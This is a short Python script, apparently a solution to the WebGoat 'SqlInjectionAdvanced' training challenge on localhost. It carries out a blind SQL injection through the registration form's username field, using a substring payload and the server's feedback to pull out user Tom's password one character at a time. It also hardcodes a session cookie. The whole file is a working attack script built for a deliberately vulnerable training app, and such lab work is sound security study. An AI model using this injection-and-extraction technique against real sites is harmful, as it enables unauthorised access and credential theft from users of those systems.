import requests
import urllib.request

website = 'http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge'
cookie = {'JSESSIONID':'I5Ecdqhep5pCRiuilPdXcDxd-mWPPZAtKHwYXSr2'}
letters = 'abcdefghijklmnoprstuwxyz1234567890'
tomPassword= ''

i = 1
j = 0

query = ''


print(query)

while j < len(letters):
    query = "tom' and substring(password,"+str(i)+",1) = '"+str(letters[j])+"' --"
    data = {'username_reg':query,'email_reg':'aaaa@a.com', 'password_reg':'a', 'confirm_password_reg':'a'}
    r = requests.put(website, data=data, cookies = cookie)
    if r.json()['feedback'][6] == '0':
        print(letters[j])
        tomPassword += letters[j]
        i = i+1
        j = 0
    else:
        j = j+1

print(tomPassword)
